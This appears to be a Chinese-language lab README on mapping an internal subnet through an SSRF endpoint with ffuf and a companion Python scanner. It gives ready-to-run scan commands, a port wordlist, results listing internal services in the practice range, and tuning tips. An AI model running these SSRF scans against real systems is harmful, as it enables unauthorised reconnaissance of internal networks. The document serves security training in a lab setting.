# SSRF 内网端口扫描（ffuf）

## 场景

- 入口：`POST http://192.168.122.16:8880/ssrf.php`，body 为 `url=http://IP:PORT`
- 目标：扫 `172.72.23.0/24` 网段的常见端口
- 为什么用 ffuf 而不是 nmap：nmap 直接发 TCP 包，但这里**唯一出口是 ssrf.php**，只能把目标喂给 `url` 参数，所以用 fuzzer 把"端口/主机"当字典替换进去。

## 原理

ffuf 把请求里的 `FUZZ` 占位符替换成字典的每一行，逐个发请求。

⚠️ **关键点**：ffuf 看到的 HTTP 状态码/响应大小是 **ssrf.php 自己的响应**，不是目标服务的直接响应。所以判断"端口是否开放"靠的是 ssrf.php 对不同情况返回的差异：

| 目标情况 | ssrf.php 可能的返回 |
|---|---|
| 端口关闭（connection refused） | 固定错误页，稳定状态码/大小 |
| 端口开放（TCP 连通） | 返回内容不同 / 成功状态 |
| 主机不可达 / 防火墙过滤 | 另一种错误 / 长时间超时 |

因此步骤是：**先摸清"关端口"的基线签名 → 过滤掉它 → 剩下的就是开的**。

## 一、准备字典

`ports.txt`（常见端口，每行一个）：

```
21
22
23
25
53
80
110
135
139
143
443
445
993
995
1723
3306
3389
5900
6379
8000
8080
8443
8888
9000
9090
9200
11211
```

## 二、摸基线：关端口长什么样

先拿一个必关端口（`:1`）手动测：

```bash
curl -si -X POST http://192.168.122.16:8880/ssrf.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://172.72.23.24:1'
```

假设返回 `HTTP/1.1 500`、body 大小 127 → 这就是"关闭"签名。

## 三、单主机扫端口

```bash
ffuf -u http://192.168.122.16:8880/ssrf.php \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'User-Agent: Mozilla/5.0' \
     -d 'url=http://172.72.23.24:FUZZ' \
     -w ports.txt \
     -timeout 5 \
     -fs 127
```

- `-fs 127`：过滤掉"关端口"响应大小
- 若关端口是特定状态码而非特定大小，改用 `-fc 500`
- 结果表里 `FUZZ` 列 = 开着的端口

## 四、整网段扫描（笛卡尔积）

`hosts.txt` 放 0~255（每行一个），与 `ports.txt` 做 clusterbomb（笛卡尔积）：

```bash
ffuf -u http://192.168.122.16:8880/ssrf.php \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'url=http://172.72.23.FUZZ:FUZZ2' \
     -w hosts.txt:FUZZ \
     -w ports.txt:FUZZ2 \
     -mode clusterbomb \
     -timeout 5 \
     -fs 127
```

## 五、保留原始请求头（`-request` 模式）

若 ssrf.php 校验 Origin/Referer，用 `-request` 读原始请求文件更省事（本仓库附 `ssrf.req`）：

```bash
ffuf -request ssrf.req -request-proto http -w ports.txt -timeout 5 -fs 127
```

> ⚠️ 用 `-request` 时删掉文件里的 `Content-Length` 行，让 ffuf 重新计算。

## 注意事项

1. **死主机的签名可能和关端口不同**（如 no route to host），`-fs` 滤不干净。稳妥做法：先用已知端口（80）确定存活主机，再对存活主机扫端口。
2. **防火墙过滤端口拖时间**：服务端请求挂到超时才返回。`-timeout` 别设太大，`-t` 线程可适当调高，否则扫得很慢。
3. 加 `-o results.json -of json` 存档，方便分析。

## 实测结果（本靶场）

对存活主机 21~27 扫常用端口，`-fs 0`（空响应=关/死）过滤后的开放服务：

```
172.72.23.21:80   size=8446   SSRF 综合靶场主站
172.72.23.22:80   size=32     index.php / shell.php
172.72.23.23:80   size=59     SQLServer
172.72.23.24:80   size=2254   network status checker
172.72.23.25:80   size=3423   XXE 实验环境
172.72.23.26:8080 size=11230  Apache Tomcat/8.5.19
172.72.23.27:6379 size=50     Redis
```

签名规律：**开放的 HTTP 服务 → `200 size>0` 且 body 就是目标内容；关端口/死主机 → `200 size=0`**。
注：22 的 3306(MySQL) 返回 size 0 —— 非 HTTP 服务不回应 GET，本方法扫不到，但不影响后续走 80 拿 shell。

## 踩坑：ffuf clusterbomb 多关键字在这个 git 版有 bug

`-d 'url=http://172.72.23.FUZZ:FUZZ2'` + `-mode clusterbomb` + 两个字典 → **0 结果**。
单关键字（`url=http://172.72.23.FUZZ:80`）正常，说明是 body 多关键字替换的问题。

**解法：把 host:port 预组合成一个字典，只用单个 FUZZ**：

```bash
for h in 21 22 23 24 25 26 27; do while read -r p; do echo "172.72.23.$h:$p"; done < ports.txt; done > hosts_ports.txt

ffuf -u http://192.168.122.16:8880/ssrf.php \
     -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'url=http://FUZZ' -w hosts_ports.txt \
     -timeout 5 -mc all -fs 0 -o results.json -of json
```

## 深坑记录：requests 空响应 + PHP $_POST

用 Python `requests` 写 SSRF 扫描器时,同样的 URL 用 curl 有内容、用 requests 却返回空。
逐层定位的真实原因:

1. **表面现象**:requests 默认 `data='url=...'`(字符串)返回 `Content-Length: 0`;
   带完整浏览器头却返回 2254。
2. **抓线确认**:requests 传字符串时不带 `Content-Type`,而且默认发
   `Accept-Encoding: gzip, deflate, br, zstd`。
3. **真凶**:`ssrf.php` 是 PHP,`$_POST` 只在请求头带
   `Content-Type: application/x-www-form-urlencoded` 时才被填充。
   requests 只有 `data` 传 **dict** 才自动加这个头 → 不带 CT 时 PHP 拿不到 `url` 参数 → 返回空。
4. 验证:`data={'url': ...}` → 2254;`data='url=...'` → 0;字符串+手动 CT → 2254。

**结论**:给 PHP 端点发 form 请求,`requests` 里 `data` 要用 dict(或手动补 Content-Type)。
另:服务端会按 `Accept-Encoding: gzip` 压缩响应(带 gzip → 963 压缩字节,不带 → 2254 明文),
`requests` 会自动解压,这点不是坑,别被它带偏。

## 教训：SSRF 扫描会打挂靶机

SSRF 端点每个请求都会在**服务端同步发起一次内网连接**,过滤/卡死的端口会占用 PHP worker
直到超时。并发一高,worker 池被占满,整个应用就无响应了(连 GET / 都超时),只能重启靶场。

- **并发要低**:`-t 10` 足够,瓶颈在靶机服务端 fetch,不在本地连接。
- **基线失败就停**:基线探测无响应说明靶机已挂,别再并发灌。
- 脚本已内置这两条:`ssrf_port_scan.py` 默认 10 线程,基线失败直接报错退出。

## 可复用脚本

`ssrf_port_scan.py` —— 比 ffuf 更省事的自包含扫描器，自动摸基线、线程池并发、可选保存响应体：

```bash
python3 ssrf_port_scan.py --hosts 172.72.23.21-27                       # 范围(完整 IP)
python3 ssrf_port_scan.py --subnet 172.72.23. --hosts alive.txt --ports ports.txt   # 纯末段主机
python3 ssrf_port_scan.py --hosts 172.72.23.0/24 --ports 80,443,8080    # CIDR
python3 ssrf_port_scan.py --subnet 172.72.23. --hosts alive.txt --ports ports.txt --save-body ./bodies
```

> `alive.txt`/`hosts.txt` 里如果只写末段(`21`),必须加 `--subnet 172.72.23.`，
> 否则脚本会把 `21` 当完整主机名发给 SSRF 端点 → 解析失败全空。完整 IP 则不需要。

## 本目录配套文件

- `ports.txt` — 常见端口字典
- `hosts.txt` — 0~255 主机末段字典
- `alive.txt` — 本靶场已知存活主机 21~27
- `hosts_ports.txt` — host:port 组合字典(绕过 clusterbomb bug)
- `ssrf.req` — `-request` 模式原始请求模板
- `ssrf_port_scan.py` — 自包含扫描脚本
